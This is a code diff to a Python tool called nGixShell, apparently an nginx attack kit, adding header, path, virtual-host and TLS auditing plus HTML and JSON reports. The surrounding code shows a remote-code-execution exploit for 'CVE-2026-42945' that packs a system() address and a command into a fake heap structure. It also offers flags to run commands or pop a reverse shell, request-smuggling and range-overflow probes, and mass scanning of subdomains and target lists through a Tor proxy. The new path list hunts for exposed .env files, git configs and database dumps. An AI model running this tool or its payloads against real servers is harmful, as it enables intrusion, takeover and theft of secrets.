@@ -76,6 +76,102 @@ COMMON_SUBDOMAINS = [
     "api2", "api3", "old", "new", "legacy", "cloud", "aws", "azure",
 ]
 
+# ─── Web audit constants ───────────────────────────────────────────────────────
+
+# (header-name, short-label, issue-description, https-only)
+SECURITY_HEADERS = [
+    ("strict-transport-security", "HSTS",
+     "Missing HSTS — allows HTTP downgrade attacks", True),
+    ("content-security-policy", "CSP",
+     "Missing Content-Security-Policy — XSS risk", False),
+    ("x-frame-options", "X-Frame-Options",
+     "Missing X-Frame-Options — clickjacking risk", False),
+    ("x-content-type-options", "X-Content-Type-Options",
+     "Missing X-Content-Type-Options: nosniff — MIME sniffing risk", False),
+    ("referrer-policy", "Referrer-Policy",
+     "Missing Referrer-Policy — information disclosure risk", False),
+    ("permissions-policy", "Permissions-Policy",
+     "Missing Permissions-Policy — feature access not restricted", False),
+]
+
+LEAK_HEADERS = [
+    "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
+    "x-generator", "x-drupal-cache", "x-varnish",
+]
+
+# Paths to probe — mix of nginx-specific, common misconfigs, and sensitive files
+INTERESTING_PATHS = [
+    # nginx
+    ("/nginx_status",          "nginx stub_status module"),
+    ("/nginx-status",          "nginx stub_status (alt path)"),
+    # Env / config leaks
+    ("/.env",                  "Environment file"),
+    ("/.env.local",            "Environment file (local)"),
+    ("/.env.production",       "Environment file (production)"),
+    ("/.env.backup",           "Environment backup"),
+    ("/.git/config",           "Git repository config"),
+    ("/.git/HEAD",             "Git repository HEAD"),
+    ("/config.json",           "JSON config file"),
+    ("/config.yml",            "YAML config file"),
+    ("/config.php",            "PHP config file"),
+    ("/web.config",            "IIS/ASP.NET config"),
+    # Backups
+    ("/backup.zip",            "Backup archive"),
+    ("/backup.tar.gz",         "Backup archive"),
+    ("/backup.sql",            "Database dump"),
+    ("/dump.sql",              "Database dump"),
+    # Admin panels
+    ("/admin",                 "Admin panel"),
+    ("/admin/",                "Admin panel"),
+    ("/administrator",         "Admin panel"),
+    ("/wp-admin/",             "WordPress admin"),
+    ("/wp-login.php",          "WordPress login"),
+    ("/phpmyadmin/",           "phpMyAdmin"),
+    ("/pma/",                  "phpMyAdmin (alt)"),
+    ("/cpanel/",               "cPanel"),
+    # API / documentation
+    ("/api/",                  "API root"),
+    ("/api/v1/",               "API v1"),
+    ("/api/v2/",               "API v2"),
+    ("/swagger",               "Swagger UI"),
+    ("/swagger-ui.html",       "Swagger UI"),
+    ("/swagger-ui/",           "Swagger UI"),
+    ("/api-docs",              "API docs"),
+    ("/openapi.json",          "OpenAPI spec"),
+    ("/graphql",               "GraphQL endpoint"),
+    ("/graphiql",              "GraphiQL IDE"),
+    # Monitoring / health
+    ("/metrics",               "Prometheus metrics"),
+    ("/actuator",              "Spring Boot actuator"),
+    ("/actuator/health",       "Spring Boot health"),
+    ("/actuator/env",          "Spring Boot env (sensitive)"),
+    ("/actuator/mappings",     "Spring Boot route mappings"),
+    ("/health",                "Health endpoint"),
+    ("/healthz",               "Health endpoint"),
+    ("/ping",                  "Ping endpoint"),
+    ("/server-status",         "Apache/nginx server status"),
+    ("/server-info",           "Apache server info"),
+    # Debug / info
+    ("/phpinfo.php",           "PHP info page"),
+    ("/info.php",              "PHP info page"),
+    ("/test.php",              "PHP test page"),
+    ("/_profiler",             "Symfony profiler"),
+    ("/debug",                 "Debug endpoint"),
+    # Standard
+    ("/robots.txt",            "Robots file"),
+    ("/sitemap.xml",           "Sitemap"),
+    ("/.well-known/security.txt", "Security contact info"),
+]
+
+# Virtual host candidates to enumerate
+COMMON_VHOSTS = [
+    "localhost", "127.0.0.1",
+    "admin", "internal", "intranet", "corp",
+    "dev", "test", "staging", "beta",
+    "api", "backend", "management",
+    "monitor", "dashboard", "portal",
+]
+
 # ─── CVE Database ─────────────────────────────────────────────────────────────
 CVE_DB = OrderedDict([
     ("CVE-2026-42945", {
@@ -298,6 +394,25 @@ def _headers_to_wire(h: dict) -> bytes:
     return b"".join(f"{k}: {v}\r\n".encode("latin-1") for k, v in h.items())
 
 
+def _parse_response(raw: bytes) -> tuple:
+    """Split raw HTTP response into (status_code, headers_dict, body_bytes)."""
+    if b"\r\n\r\n" in raw:
+        hdr_raw, body = raw.split(b"\r\n\r\n", 1)
+    else:
+        hdr_raw, body = raw, b""
+    headers = {}
+    status  = 0
+    lines   = hdr_raw.decode("latin-1", errors="replace").split("\r\n")
+    if lines:
+        try:    status = int(lines[0].split()[1])
+        except: pass
+        for line in lines[1:]:
+            if ":" in line:
+                k, _, v = line.partition(":")
+                headers[k.strip().lower()] = v.strip()
+    return status, headers, body
+
+
 # ─── Network helpers ──────────────────────────────────────────────────────────
 
 def _connect_socks5(host: str, port: int, proxy_host: str,
@@ -368,29 +483,44 @@ def _http_head(host: str, port: int, path: str = "/",
             raw += chunk
     finally:
         s.close()
-
-    headers = {}
-    lines   = raw.decode("latin-1", errors="replace").split("\r\n")
+    _, headers, _ = _parse_response(raw + b"\r\n\r\n")
+    lines = raw.decode("latin-1", errors="replace").split("\r\n")
     if lines:
         headers["status_line"] = lines[0]
         try:    headers["status_code"] = int(lines[0].split()[1])
         except: headers["status_code"] = 0
-    for line in lines[1:]:
-        if ":" in line:
-            k, _, v = line.partition(":")
-            headers[k.strip().lower()] = v.strip()
     return headers
 
 
+def _http_get(host: str, port: int, path: str = "/",
+              tls: bool = False, proxy: str = None,
+              timeout: float = 5.0, max_body: int = 8192) -> tuple:
+    """GET request — returns (status_code, headers_dict, body_bytes)."""
+    if _rate_limiter:
+        _rate_limiter.acquire()
+    s   = _connect(host, port, timeout=timeout, tls=tls, proxy=proxy)
+    req = f"GET {path} HTTP/1.1\r\n".encode() + _headers_to_wire(_build_headers(host)) + b"\r\n"
+    s.sendall(req)
+    s.settimeout(timeout)
+    raw = b""
+    try:
+        while len(raw) < max_body + 4096:
+            chunk = s.recv(4096)
+            if not chunk: break
+            raw += chunk
+    finally:
+        s.close()
+    status, headers, body = _parse_response(raw)
+    return status, headers, body[:max_body]
+
+
 def _auto_detect_tls(host: str, port: int, proxy: str = None) -> bool:
-    """Try plain HTTP first; if it fails with SSL error, return True (TLS needed)."""
     try:
         _connect(host, port, timeout=4, tls=False, proxy=proxy).close()
         return False
     except ssl.SSLError:
         return True
     except Exception:
-        # Try TLS anyway
         try:
             _connect(host, port, timeout=4, tls=True, proxy=proxy).close()
             return True
@@ -401,16 +531,12 @@ def _auto_detect_tls(host: str, port: int, proxy: str = None) -> bool:
 # ─── Target parser ────────────────────────────────────────────────────────────
 
 def parse_target(target: str, default_port: int = 19321) -> tuple:
-    """
-    Parse 'host', 'host:port', 'http://host:port', 'https://host:port'.
-    Returns (host, port, tls_forced).
-    """
     tls_forced = False
     if "://" in target:
-        p  = urlparse(target)
+        p          = urlparse(target)
         tls_forced = p.scheme.lower() == "https"
-        host = p.hostname or "127.0.0.1"
-        port = p.port or (443 if tls_forced else 80)
+        host       = p.hostname or "127.0.0.1"
+        port       = p.port or (443 if tls_forced else 80)
         return host, port, tls_forced
 
     if target.startswith("["):
@@ -425,7 +551,6 @@ def parse_target(target: str, default_port: int = 19321) -> tuple:
     else:
         host = target
         port = default_port
-
     return host, port, False
 
 
@@ -469,7 +594,7 @@ def fingerprint_target(host: str, port: int,
                 ctx = ssl.create_default_context()
                 ctx.check_hostname = False
                 ctx.verify_mode    = ssl.CERT_NONE
-                ts  = ctx.wrap_socket(raw, server_hostname=host)
+                ts   = ctx.wrap_socket(raw, server_hostname=host)
                 cert = ts.getpeercert()
                 ts.close()
                 if cert:
@@ -525,6 +650,307 @@ def check_target(host: str, port: int,
         return False, None
 
 
+# ─── Web audit ────────────────────────────────────────────────────────────────
+
+def audit_headers(host: str, port: int,
+                  tls: bool = False, proxy: str = None) -> list:
+    """
+    Check HTTP response headers for missing security headers and information leaks.
+    Returns list of issue dicts: {header, severity, issue}.
+    """
+    issues = []
+    try:
+        status, headers, _ = _http_get(host, port, "/", tls=tls, proxy=proxy)
+    except Exception as e:
+        vlog(f"[v] audit_headers connect error: {e}")
+        return issues
+
+    log(f"\n[*] Header security audit — {host}:{port}")
+    log("─" * 70)
+
+    # Missing security headers
+    for hdr_name, label, desc, https_only in SECURITY_HEADERS:
+        if https_only and not tls:
+            continue
+        if hdr_name not in headers:
+            sev = "HIGH" if hdr_name in ("strict-transport-security",
+                                          "content-security-policy") else "MEDIUM"
+            log(f"  [!] {label:<30} {sev:<8} {desc}")
+            issues.append({"header": label, "severity": sev, "issue": desc, "type": "missing"})
+        else:
+            log(f"  [+] {label:<30} {'OK':<8} {headers[hdr_name][:60]}")
+
+    # Leaky headers that reveal technology stack
+    for hdr_name in LEAK_HEADERS:
+        if hdr_name in headers:
+            msg = f"Header '{hdr_name}' leaks server technology: {headers[hdr_name]}"
+            log(f"  [!] {hdr_name:<30} {'LOW':<8} {msg}")
+            issues.append({"header": hdr_name, "severity": "LOW", "issue": msg, "type": "leak"})
+
+    # Server header version disclosure
+    server = headers.get("server", "")
+    if server and re.search(r"\d+\.\d+", server):
+        msg = f"Server header exposes version: {server}"
+        log(f"  [!] {'server':<30} {'LOW':<8} {msg}")
+        issues.append({"header": "server", "severity": "LOW", "issue": msg, "type": "leak"})
+
+    log("─" * 70)
+    log(f"[+] Header issues: {len(issues)}")
+    return issues
+
+
+def path_discovery(host: str, port: int,
+                   tls: bool = False, proxy: str = None,
+                   extra_paths: list = None) -> list:
+    """
+    Probe a wordlist of interesting paths. Returns found paths (non-404 status).
+    """
+    paths  = list(INTERESTING_PATHS)
+    if extra_paths:
+        for p in extra_paths:
+            paths.append((p, "custom"))
+
+    found  = []
+    log(f"\n[*] Path discovery — {host}:{port} ({len(paths)} paths)")
+    log("─" * 70)
+    log(f"  {'STATUS':<8} {'PATH':<40} NOTE")
+    log("─" * 70)
+
+    for path, note in paths:
+        try:
+            if _rate_limiter:
+                _rate_limiter.acquire()
+            status, hdrs, body = _http_get(host, port, path,
+                                           tls=tls, proxy=proxy, timeout=5)
+            if status == 404:
+                vlog(f"[v] {status} {path}")
+                continue
+
+            content_type = hdrs.get("content-type", "")
+            marker = "[!]" if status == 200 else "[~]"
+            log(f"  {marker} {status:<6}   {path:<40} {note}")
+
+            entry = {"path": path, "status": status, "note": note,
+                     "content_type": content_type, "body_preview": ""}
+
+            # Capture stub_status body for parsing
+            if status == 200 and path in ("/nginx_status", "/nginx-status"):
+                entry["body_preview"] = body.decode("latin-1", errors="replace")[:256]
+
+            found.append(entry)
+        except Exception as e:
+            vlog(f"[v] {path}: {e}")
+
+    log("─" * 70)
+    log(f"[+] Interesting paths: {len(found)}")
+    return found
+
+
+def check_stub_status(host: str, port: int,
+                      tls: bool = False, proxy: str = None) -> dict:
+    """
+    Parse nginx stub_status output from /nginx_status.
+    Returns parsed metrics dict or empty dict if not available.
+    """
+    try:
+        status, _, body = _http_get(host, port, "/nginx_status",
+                                    tls=tls, proxy=proxy, timeout=5)
+        if status != 200:
+            return {}
+        text = body.decode("latin-1", errors="replace")
+        if "Active connections" not in text:
+            return {}
+
+        result = {}
+        m = re.search(r"Active connections:\s*(\d+)", text)
+        if m: result["active_connections"] = int(m.group(1))
+        m = re.search(r"(\d+)\s+(\d+)\s+(\d+)", text)
+        if m:
+            result["accepts"]  = int(m.group(1))
+            result["handled"]  = int(m.group(2))
+            result["requests"] = int(m.group(3))
+        m = re.search(r"Reading:\s*(\d+)\s+Writing:\s*(\d+)\s+Waiting:\s*(\d+)", text)
+        if m:
+            result["reading"] = int(m.group(1))
+            result["writing"] = int(m.group(2))
+            result["waiting"] = int(m.group(3))
+
+        log(f"\n[!] nginx stub_status exposed at /nginx_status:")
+        for k, v in result.items():
+            log(f"    {k}: {v}")
+        return result
+    except Exception as e:
+        vlog(f"[v] stub_status: {e}")
+        return {}
+
+
+def vhost_enum(host: str, port: int,
+               tls: bool = False, proxy: str = None) -> list:
+    """
+    Send requests with different Host headers and detect virtual hosts that
+    respond differently from the baseline.
+    """
+    found = []
+    log(f"\n[*] Virtual host enumeration — {host}:{port}")
+    log("─" * 70)
+
+    # Baseline
+    try:
+        baseline_status, baseline_hdrs, baseline_body = _http_get(
+            host, port, "/", tls=tls, proxy=proxy, timeout=5)
+        baseline_len = len(baseline_body)
+        baseline_ct  = baseline_hdrs.get("content-type", "")
+    except Exception as e:
+        log(f"  [!] Baseline failed: {e}")
+        return found
+
+    log(f"  Baseline: {host} → {baseline_status} ({baseline_len} bytes)")
+    log(f"  {'VHOST':<35} {'STATUS':<8} {'SIZE':<10} NOTE")
+    log("─" * 70)
+
+    for vhost in COMMON_VHOSTS:
+        if vhost == host:
+            continue
+        try:
+            if _rate_limiter:
+                _rate_limiter.acquire()
+            s   = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
+            req = (f"GET / HTTP/1.1\r\nHost: {vhost}\r\n"
+                   f"User-Agent: {_user_agent}\r\nConnection: close\r\n\r\n").encode()
+            s.sendall(req)
+            s.settimeout(5)
+            raw = b""
+            while len(raw) < 16384:
+                chunk = s.recv(4096)
+                if not chunk: break
+                raw += chunk
+            s.close()
+
+            status, hdrs, body = _parse_response(raw)
+            size = len(body)
+            ct   = hdrs.get("content-type", "")
+
+            # Flag if meaningfully different from baseline
+            different = (status != baseline_status or
+                         abs(size - baseline_len) > 50 or
+                         ct != baseline_ct)
+            if different:
+                note = f"status differs" if status != baseline_status else f"body differs ({size} vs {baseline_len}b)"
+                log(f"  [!] {vhost:<35} {status:<8} {size:<10} {note}")
+                found.append({"vhost": vhost, "status": status, "size": size,
+                              "content_type": ct, "note": note})
+            else:
+                vlog(f"[v] {vhost}: same as baseline")
+        except Exception as e:
+            vlog(f"[v] vhost {vhost}: {e}")
+
+    log("─" * 70)
+    log(f"[+] Distinct virtual hosts: {len(found)}")
+    return found
+
+
+def tls_audit(host: str, port: int, proxy: str = None) -> dict:
+    """
+    Test TLS protocol support and certificate validity.
+    Returns dict with issues list and cert info.
+    """
+    result  = {"issues": [], "cert": {}, "protocols": {}}
+    issues  = result["issues"]
+
+    log(f"\n[*] TLS audit — {host}:{port}")
+    log("─" * 70)
+
+    # Protocol version tests — try to connect forcing a max version
+    proto_tests = []
+    for attr in ("TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"):
+        if hasattr(ssl.TLSVersion, attr):
+            proto_tests.append(attr)
+
+    for proto_name in proto_tests:
+        try:
+            ver    = getattr(ssl.TLSVersion, proto_name)
+            ctx    = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode    = ssl.CERT_NONE
+            ctx.minimum_version = ver
+            ctx.maximum_version = ver
+            raw = socket.create_connection((host, port), timeout=4)
+            ts  = ctx.wrap_socket(raw, server_hostname=host)
+            ts.close()
+            result["protocols"][proto_name] = True
+            label    = proto_name.replace("TLSv1", "TLS 1.").replace("_", ".")
+            is_old   = proto_name in ("TLSv1", "TLSv1_1")
+            severity = "HIGH" if is_old else "INFO"
+            msg      = f"{label} supported{'  ← DEPRECATED' if is_old else ''}"
+            log(f"  {'[!]' if is_old else '[+]'} {label:<20} {severity:<8} {msg}")
+            if is_old:
+                issues.append({"issue": f"{label} supported (deprecated)", "severity": severity})
+        except ssl.SSLError:
+            result["protocols"][proto_name] = False
+            label = proto_name.replace("TLSv1", "TLS 1.").replace("_", ".")
+            log(f"  [-] {label:<20} {'OK':<8} not supported")
+        except Exception as e:
+            vlog(f"[v] TLS {proto_name}: {e}")
+
+    # Certificate checks
+    try:
+        raw  = socket.create_connection((host, port), timeout=5)
+        ctx  = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode    = ssl.CERT_NONE
+        ts   = ctx.wrap_socket(raw, server_hostname=host)
+        cert = ts.getpeercert()
+        ts.close()
+
+        if cert:
+            subj   = dict(x[0] for x in cert.get("subject", []))
+            issuer = dict(x[0] for x in cert.get("issuer", []))
+            cn     = subj.get("commonName", "")
+            not_after_str = cert.get("notAfter", "")
+            result["cert"] = {"cn": cn, "issuer": issuer.get("commonName", ""),
+                               "not_after": not_after_str}
+
+            log(f"  [*] Cert CN     : {cn}")
+            log(f"  [*] Issuer      : {issuer.get('commonName', '?')}")
+
+            # Expiry check
+            if not_after_str:
+                try:
+                    expiry = datetime.datetime.strptime(
+                        not_after_str, "%b %d %H:%M:%S %Y %Z"
+                    ).replace(tzinfo=datetime.timezone.utc)
+                    now    = datetime.datetime.now(datetime.timezone.utc)
+                    days   = (expiry - now).days
+                    result["cert"]["days_remaining"] = days
+                    if days < 0:
+                        msg = f"Certificate EXPIRED {abs(days)} days ago"
+                        log(f"  [!] {'Expiry':<20} {'CRITICAL':<8} {msg}")
+                        issues.append({"issue": msg, "severity": "CRITICAL"})
+                    elif days < 30:
+                        msg = f"Certificate expires in {days} days"
+                        log(f"  [!] {'Expiry':<20} {'HIGH':<8} {msg}")
+                        issues.append({"issue": msg, "severity": "HIGH"})
+                    else:
+                        log(f"  [+] {'Expiry':<20} {'OK':<8} {days} days remaining")
+                except Exception as e:
+                    vlog(f"[v] cert expiry parse: {e}")
+
+            # Self-signed check
+            if subj == issuer:
+                msg = "Self-signed certificate"
+                log(f"  [!] {'Self-signed':<20} {'MEDIUM':<8} {msg}")
+                issues.append({"issue": msg, "severity": "MEDIUM"})
+            else:
+                log(f"  [+] {'Self-signed':<20} {'OK':<8} issued by CA")
+
+    except Exception as e:
+        vlog(f"[v] cert check: {e}")
+
+    log("─" * 70)
+    log(f"[+] TLS issues: {len(issues)}")
+    return result
+
+
 # ─── Heap helpers ─────────────────────────────────────────────────────────────
 
 def addr_is_safe(addr: int) -> bool:
@@ -546,9 +972,9 @@ def list_candidates() -> None:
 
 
 def make_body(cmd: str, data_addr: int, body_len: int) -> bytes:
-    fake  = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
-    cb    = cmd.encode('utf-8') + b'\x00'
-    pl    = fake + cb
+    fake = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
+    cb   = cmd.encode('utf-8') + b'\x00'
+    pl   = fake + cb
     if len(pl) > body_len:
         log(f"[!] Command too long ({len(pl)} > {body_len})")
         sys.exit(1)
@@ -572,7 +998,7 @@ def probe_range_overflow(host, port, tls, proxy):
         s.close()
         parts  = raw.decode("latin-1").split()
         status = int(parts[1]) if len(parts) > 1 else 0
-        if status == 400:   return False, "400 — patched"
+        if status == 400:        return False, "400 — patched"
         if status in (416, 200): return False, f"{status} — range ignored"
         return True, f"Status {status} — overflow Range indicator"
     except Exception as e:
@@ -597,8 +1023,7 @@ def probe_smuggling(host, port, tls, proxy):
         except socket.timeout:
             pass
         s.close()
-        if raw.count(b"HTTP/") >= 2:
-            return True, "Two HTTP responses — smuggling indicator"
+        if raw.count(b"HTTP/") >= 2: return True, "Two HTTP responses — smuggling indicator"
         return False, "Single response"
     except Exception as e:
         return None, f"probe error: {e}"
@@ -715,7 +1140,6 @@ def list_cves() -> None:
 def cve_scan(host: str, port: int, tls: bool = False,
              proxy: str = None, target_cve: str = None,
              version: tuple = None) -> list:
-    """Run CVE checks. Pass version tuple if already detected to skip re-check."""
     log(f"\n[*] CVE scan — {host}:{port}")
     log("─" * 96)
 
@@ -957,20 +1381,26 @@ _STATUS_COLOR = {
     "VERSION-MATCH": "#ffaa00", "UNKNOWN": "#888888",
     "PATCHED": "#44aa44", "PROBE-CLEAN": "#44aa44", "LOCAL-ONLY": "#6688aa",
 }
+_ISSUE_SEV_COLOR = {"CRITICAL": "#ff4444", "HIGH": "#ff8800",
+                    "MEDIUM": "#ffcc00", "LOW": "#aaaaaa", "INFO": "#58a6ff"}
 
 
-def generate_html_report(host, port, findings, fingerprint=None,
+def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
                          elapsed=0.0, path="ngixshell_report.html"):
     ts   = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
-    rows = ""
+
+    # CVE table rows
+    cve_rows = ""
     for cve_id, info, status in findings:
         sc = _STATUS_COLOR.get(status, "#888")
         vc = _SEV_COLOR.get(info["severity"], "#888")
-        rows += (f"<tr><td><a href='{info.get('ref','')}' style='color:#58a6ff'>{cve_id}</a></td>"
-                 f"<td style='color:{vc}'>{info['cvss']} {info['severity']}</td>"
-                 f"<td style='color:{sc};font-weight:bold'>{status}</td>"
-                 f"<td>{info['description']}</td>"
-                 f"<td>{info['fixed_in']}</td></tr>\n")
+        cve_rows += (f"<tr><td><a href='{info.get('ref','')}' style='color:#58a6ff'>{cve_id}</a></td>"
+                     f"<td style='color:{vc}'>{info['cvss']} {info['severity']}</td>"
+                     f"<td style='color:{sc};font-weight:bold'>{status}</td>"
+                     f"<td>{info['description']}</td>"
+                     f"<td>{info['fixed_in']}</td></tr>\n")
+
+    # Fingerprint section
     fp_html = ""
     if fingerprint:
         fp_html = "<h2>Fingerprint</h2><table>"
@@ -979,28 +1409,90 @@ def generate_html_report(host, port, findings, fingerprint=None,
             fp_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
         fp_html += "</table>"
 
+    # Web audit sections
+    web_html = ""
+    if web_audit:
+        # Header audit
+        hdr_issues = web_audit.get("header_issues", [])
+        if hdr_issues:
+            web_html += "<h2>Header Security Audit</h2><table><tr><th>Header</th><th>Severity</th><th>Issue</th></tr>"
+            for iss in hdr_issues:
+                sc = _ISSUE_SEV_COLOR.get(iss["severity"], "#888")
+                web_html += (f"<tr><td>{iss['header']}</td>"
+                             f"<td style='color:{sc}'>{iss['severity']}</td>"
+                             f"<td>{iss['issue']}</td></tr>")
+            web_html += "</table>"
+
+        # Paths found
+        paths_found = web_audit.get("paths_found", [])
+        if paths_found:
+            web_html += "<h2>Discovered Paths</h2><table><tr><th>Status</th><th>Path</th><th>Note</th></tr>"
+            for p in paths_found:
+                sc = "#ff8800" if p["status"] == 200 else "#ffcc00"
+                web_html += (f"<tr><td style='color:{sc}'>{p['status']}</td>"
+                             f"<td>{p['path']}</td><td>{p['note']}</td></tr>")
+            web_html += "</table>"
+
+        # Virtual hosts
+        vhosts_found = web_audit.get("vhosts_found", [])
+        if vhosts_found:
+            web_html += "<h2>Virtual Hosts Detected</h2><table><tr><th>VHost</th><th>Status</th><th>Note</th></tr>"
+            for vh in vhosts_found:
+                web_html += (f"<tr><td style='color:#58a6ff'>{vh['vhost']}</td>"
+                             f"<td>{vh['status']}</td><td>{vh['note']}</td></tr>")
+            web_html += "</table>"
+
+        # TLS issues
+        tls_result = web_audit.get("tls_result", {})
+        tls_issues = tls_result.get("issues", [])
+        if tls_issues:
+            web_html += "<h2>TLS Issues</h2><table><tr><th>Severity</th><th>Issue</th></tr>"
+            for iss in tls_issues:
+                sc = _ISSUE_SEV_COLOR.get(iss["severity"], "#888")
+                web_html += (f"<tr><td style='color:{sc}'>{iss['severity']}</td>"
+                             f"<td>{iss['issue']}</td></tr>")
+            web_html += "</table>"
+
+        # stub_status
+        stub = web_audit.get("stub_status", {})
+        if stub:
+            web_html += "<h2>nginx stub_status (EXPOSED)</h2><table>"
+            for k, v in stub.items():
+                web_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
+            web_html += "</table>"
+
+    total_issues = len(findings) + len(web_audit.get("header_issues", []) if web_audit else [])
+
     with open(path, "w", encoding="utf-8") as f:
         f.write(f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
 <title>nGixShell — {host}:{port}</title>
-<style>body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:24px;margin:0}}
-h1{{color:#00e676;letter-spacing:2px}}h2{{color:#58a6ff;margin-top:28px}}
+<style>
+body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:24px;margin:0}}
+h1{{color:#00e676;letter-spacing:2px}}h2{{color:#58a6ff;margin-top:32px;border-bottom:1px solid #30363d;padding-bottom:6px}}
 table{{border-collapse:collapse;width:100%;margin-top:12px}}
 th{{background:#161b22;color:#8b949e;text-align:left;padding:8px 12px;border-bottom:1px solid #30363d}}
 td{{padding:7px 12px;border-bottom:1px solid #21262d;vertical-align:top}}
-tr:hover td{{background:#161b22}}.meta{{color:#8b949e;margin-bottom:24px;font-size:13px}}</style>
-</head><body>
-<h1>nGixShell — CVE Scan Report</h1>
-<div class="meta">Target: <strong>{host}:{port}</strong> &nbsp;|&nbsp;
-Generated: {ts} &nbsp;|&nbsp; Elapsed: {elapsed:.1f}s &nbsp;|&nbsp; Findings: {len(findings)}</div>
+tr:hover td{{background:#161b22}}.meta{{color:#8b949e;margin-bottom:24px;font-size:13px}}
+</style></head><body>
+<h1>nGixShell — Web Security Report</h1>
+<div class="meta">
+  Target: <strong>{host}:{port}</strong> &nbsp;|&nbsp;
+  Generated: {ts} &nbsp;|&nbsp;
+  Elapsed: {elapsed:.1f}s &nbsp;|&nbsp;
+  Total issues: {total_issues}
+</div>
 {fp_html}
 <h2>CVE Findings</h2>
 <table><tr><th>CVE</th><th>CVSS / Severity</th><th>Status</th><th>Description</th><th>Fixed In</th></tr>
-{rows or '<tr><td colspan="5" style="color:#44aa44">No issues detected.</td></tr>'}
-</table></body></html>""")
+{cve_rows or '<tr><td colspan="5" style="color:#44aa44">No CVE issues detected.</td></tr>'}
+</table>
+{web_html}
+</body></html>""")
     log(f"[+] HTML report: {path}")
 
 
-def _build_json_output(host, port, findings, fingerprint=None, elapsed=0.0):
+def _build_json_output(host, port, findings, fingerprint=None,
+                       web_audit=None, elapsed=0.0):
     out = {
         "tool":      "nGixShell",
         "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z"),
@@ -1016,6 +1508,15 @@ def _build_json_output(host, port, findings, fingerprint=None, elapsed=0.0):
             "status": status, "description": info["description"],
             "fixed_in": info["fixed_in"], "ref": info.get("ref", ""),
         })
+    if web_audit:
+        out["web_audit"] = {
+            "header_issues":  web_audit.get("header_issues", []),
+            "paths_found":    [{k: v for k, v in p.items() if k != "body_preview"}
+                               for p in web_audit.get("paths_found", [])],
+            "vhosts_found":   web_audit.get("vhosts_found", []),
+            "tls_issues":     web_audit.get("tls_result", {}).get("issues", []),
+            "stub_status":    web_audit.get("stub_status", {}),
+        }
     return out
 
 
@@ -1032,7 +1533,7 @@ def main() -> int:
         epilog="""\
 Usage examples
 ──────────────
-  Scan a target (auto mode — fingerprint + all CVEs + report):
+  Full auto scan (fingerprint + CVEs + web audit + report):
     ngixshell.py 127.0.0.1:19321
     ngixshell.py https://192.168.1.10
 
@@ -1043,84 +1544,80 @@ Usage examples
   Subdomain scan:
     ngixshell.py --subdomain-scan example.com --scan-port 443
 
-  Multiple targets from file:
+  Multiple targets:
     ngixshell.py --target-file hosts.txt
 
-  List CVE database:
-    ngixshell.py --list-cves
-
-  With proxy / auth / custom headers:
+  With proxy / auth:
     ngixshell.py 127.0.0.1 --proxy socks5://127.0.0.1:9050
     ngixshell.py 127.0.0.1 --auth admin:pass --header "X-Token: abc"
 """,
     )
 
-    # ── Target (positional, optional) ────────────────────────────────────────
-    parser.add_argument("target", nargs="?", default=None,
-                        metavar="TARGET",
+    # ── Target ───────────────────────────────────────────────────────────────
+    parser.add_argument("target", nargs="?", default=None, metavar="TARGET",
                         help="host, host:port, http://host:port, https://host:port "
                              "(default: 127.0.0.1:19321)")
 
-    # ── Exploit flags ─────────────────────────────────────────────────────────
-    exploit = parser.add_argument_group("exploit (CVE-2026-42945)")
-    exploit.add_argument("--cmd",      metavar="CMD",  help="command to execute via RCE")
-    exploit.add_argument("--cmd-file", metavar="FILE", help="file with commands (one per line)")
-    exploit.add_argument("--shell",    action="store_true", help="pop a reverse shell")
+    # ── Exploit ───────────────────────────────────────────────────────────────
+    ex = parser.add_argument_group("exploit (CVE-2026-42945)")
+    ex.add_argument("--cmd",      metavar="CMD",  help="command to execute via RCE")
+    ex.add_argument("--cmd-file", metavar="FILE", help="file with commands (one per line)")
+    ex.add_argument("--shell",    action="store_true", help="pop a reverse shell")
 
-    # ── Special modes ─────────────────────────────────────────────────────────
-    special = parser.add_argument_group("special modes")
-    special.add_argument("--subdomain-scan",  metavar="DOMAIN",
-                         help="scan subdomains of DOMAIN for vulnerable nginx")
-    special.add_argument("--cve",             metavar="CVE-ID",
-                         help="test one specific CVE (e.g. CVE-2017-7529)")
-    special.add_argument("--list-cves",       action="store_true",
-                         help="print CVE database and exit")
-    special.add_argument("--list-candidates", action="store_true",
-                         help="print heap candidates and exit")
-    special.add_argument("--dry-run",         action="store_true",
-                         help="fingerprint + CVE scan only, skip exploit")
-    special.add_argument("--target-file",     metavar="FILE",
-                         help="file with host[:port] targets (one per line)")
+    # ── Modes ─────────────────────────────────────────────────────────────────
+    sp = parser.add_argument_group("special modes")
+    sp.add_argument("--subdomain-scan",  metavar="DOMAIN",
+                    help="scan subdomains of DOMAIN for vulnerable nginx")
+    sp.add_argument("--cve",             metavar="CVE-ID",
+                    help="test one specific CVE (e.g. CVE-2017-7529)")
+    sp.add_argument("--list-cves",       action="store_true",
+                    help="print CVE database and exit")
+    sp.add_argument("--list-candidates", action="store_true",
+                    help="print heap candidates and exit")
+    sp.add_argument("--dry-run",         action="store_true",
+                    help="fingerprint + scan only, no exploit")
+    sp.add_argument("--target-file",     metavar="FILE",
+                    help="file with host[:port] targets (one per line)")
 
-    # ── Connection options ────────────────────────────────────────────────────
-    conn = parser.add_argument_group("connection")
-    conn.add_argument("--port",  type=int, default=None,
-                      help="override port (useful when TARGET has no port)")
-    conn.add_argument("--tls",   action="store_true",
-                      help="force TLS (auto-detected by default)")
-    conn.add_argument("--proxy", metavar="URL",
-                      help="proxy: http://, https://, socks5://")
+    # ── Web audit ─────────────────────────────────────────────────────────────
